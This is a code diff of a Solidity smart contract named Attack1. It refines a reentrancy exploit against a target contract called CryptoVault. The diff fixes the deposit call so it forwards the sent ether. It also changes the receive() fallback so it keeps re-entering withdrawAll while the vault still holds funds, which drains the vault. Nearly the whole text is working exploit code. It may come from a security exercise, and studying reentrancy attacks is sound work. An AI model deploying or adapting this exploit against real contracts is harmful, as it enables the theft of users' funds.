@@ -114,14 +114,22 @@ contract Attack1 {
         cv = CryptoVault(payable (_cv));
     }
 
+    function useless() external payable{
+        require(msg.value >= 1);
+        cv.deposit{value: msg.value}();
+        cv.withdraw(msg.value);
+    }
+
     function attack() external payable {
         require(msg.value >= 1);
-        cv.deposit();
+        cv.deposit{value: msg.value}();
         cv.withdrawAll();
     }
 
     receive() external payable {
-        cv.withdrawAll();
+        if(cv.getBalance() >= msg.value){
+            cv.withdrawAll();
+        }
     }
 
     function getbalance() public view returns(uint){
